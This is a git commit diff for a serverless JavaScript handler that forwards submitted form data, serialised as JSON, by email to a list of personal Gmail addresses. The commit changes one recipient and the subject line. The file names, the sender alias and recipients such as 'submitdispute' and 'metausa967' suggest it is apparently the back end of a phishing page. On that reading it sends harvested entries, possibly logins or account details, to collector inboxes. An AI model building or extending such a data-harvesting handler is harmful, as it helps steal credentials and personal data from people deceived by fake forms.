db70c71ba6ca843ee1f5ed4e02fed4fe9760dc63
zm9807350 <zm9807350@gmail.com>
2026-03-03 17:25:36 +0500

    Update and rename Destiny.js to rajab.js

--- rajab.js
+++ rajab.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,metausa967@gmail.com",
-      subject: "Destiny 11",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,rajabkingali725@gmail.com",
+      subject: "rajab",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
